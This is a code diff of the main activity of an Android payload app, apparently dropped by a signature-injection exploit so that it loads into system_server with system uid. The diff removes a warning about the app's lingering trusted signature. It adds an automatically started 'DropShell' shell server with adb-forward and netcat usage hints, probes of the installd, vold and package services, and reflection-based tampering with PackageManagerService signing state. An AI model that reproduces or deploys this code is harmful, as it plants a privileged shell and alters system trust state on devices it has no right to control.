@@ -3,73 +3,77 @@ package com.example.abxoverflow.droppedapk;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.content.pm.PackageManager;
-import android.os.Build;
 import android.os.Bundle;
 import android.os.Process;
-import android.view.ContextMenu;
 import android.view.Menu;
 import android.view.MenuItem;
-import android.view.View;
 import android.widget.TextView;
 import android.widget.Toast;
+import android.util.Log;
 
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.lang.reflect.Field;
-import java.lang.reflect.InvocationTargetException;
 import java.util.Map;
 
 public class MainActivity extends Activity {
+
+    private static final String TAG = "DropShell";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        LocalShellServer.ensureStarted(this);
+
         String id = "?";
         try {
             id = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();
-        } catch (IOException e) {}
+        } catch (IOException ignored) {}
 
         StringBuilder s = new StringBuilder();
-        s
-                .append(
-                        "Note: Installation of this app involved registering new signature trusted for sharedUserId=android.uid.system," +
-                                " if you uninstall usual way it will stay in system" +
-                                " and you will be able to reinstall this app despite mismatched signature." +
-                                " To fully uninstall use \"Uninstall\" button within this app" +
-                                "\n\nuid=").append(Process.myUid())
-                .append("\npid=").append(Process.myPid())
-                .append("\n\n").append(id)
-                .append("\n\nBelow is list of system services, as this app loads into system_server it can directly tamper with local ones (those that are non-null and non-BinderProxy)");
+        s.append("uid=").append(Process.myUid())
+                .append(" pid=").append(Process.myPid())
+                .append(" (system_server)\n\n")
+                .append(id)
+                .append("\n\nDropShell: adb forward tcp:")
+                .append(LocalShellServer.PORT)
+                .append(" tcp:")
+                .append(LocalShellServer.PORT)
+                .append("\nthen: nc 127.0.0.1 ")
+                .append(LocalShellServer.PORT)
+                .append("\nrunning=")
+                .append(LocalShellServer.isRunning())
+                .append("\n\ninstalld/vold probes:\n");
 
-        try {
-            Class<?> serviceManager = Class.forName("android.os.ServiceManager");
-            for (String serviceName : ((String[]) serviceManager.getMethod("listServices").invoke(null))) {
-                String serviceStr;
-                try {
-                    Object serviceObj = serviceManager
-                            .getMethod("getService", String.class)
-                            .invoke(null, serviceName);
-                    if (serviceObj != null) {
-                        serviceStr = serviceObj.toString();
-                    } else {
-                        serviceStr = "null (getService() was disallowed)";
-                    }
-                } catch (Throwable e) {
-                    if (e instanceof InvocationTargetException) {
-                        e = ((InvocationTargetException) e).getTargetException();
-                    }
-                    serviceStr = e.getClass().getName() + ": " + e.getMessage();
-                }
-                s.append("\n\n").append(serviceName).append(":\n").append(serviceStr);
-            }
-        } catch (Exception e) {
-            s.append("\n\nFailed listing services");
-        }
+        probeService(s, "installd");
+        probeService(s, "vold");
+        probeService(s, "package");
+
+        s.append("\n\nTry: help | exec dmesg -w | installd copy ... | vold read_partition ...");
+        s.append("\nNote: uid 1000, not kernel root. /system writes break AVB — use /data only.");
 
         ((TextView) findViewById(R.id.app_text)).setText(s.toString());
+
+        try {
+            Log.i(TAG, "Installd ping: " + new InstalldClient().installd());
+            Log.i(TAG, "PMS installer: " + PmsHelper.getInstallerFromPms());
+        } catch (Exception e) {
+            Log.e(TAG, "startup probes failed", e);
+        }
+    }
+
+    private static void probeService(StringBuilder s, String name) {
+        try {
+            Object obj = Class.forName("android.os.ServiceManager")
+                    .getMethod("getService", String.class)
+                    .invoke(null, name);
+            s.append(name).append(": ").append(obj == null ? "null" : obj.toString()).append("\n");
+        } catch (Exception e) {
+            s.append(name).append(": ").append(e.getMessage()).append("\n");
+        }
     }
 
     @Override
@@ -78,14 +82,13 @@ public class MainActivity extends Activity {
         return true;
     }
 
-    @SuppressLint("MissingPermission")
     @Override
+    @SuppressLint("MissingPermission")
     public boolean onOptionsItemSelected(MenuItem item) {
         if (item.getItemId() == R.id.uninstall) {
             try {
-                // Delete <pastSigs> by directly editing PackageManagerService state within system_server
-                // ServiceManager.getService("package").this$0.mSettings.mSharedUsers.get("android.uid.system").getSigningDetails().mPastSigningCertificates = null
-                Object packManImplService = Class.forName("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, "package");
+                Object packManImplService = Class.forName("android.os.ServiceManager")
+                        .getMethod("getService", String.class).invoke(null, "package");
                 Field packManImplThisField = packManImplService.getClass().getDeclaredField("this$0");
                 packManImplThisField.setAccessible(true);
                 Object packManService = packManImplThisField.get(packManImplService);
@@ -100,7 +103,6 @@ public class MainActivity extends Activity {
                 pastSigningCertificatesField.setAccessible(true);
                 pastSigningCertificatesField.set(signingDetails, null);
 
-                // Uninstall this app (also triggers write of fixed packages.xml)
                 getPackageManager().getPackageInstaller().uninstall(getPackageName(), null);
             } catch (Exception e) {
                 e.printStackTrace();
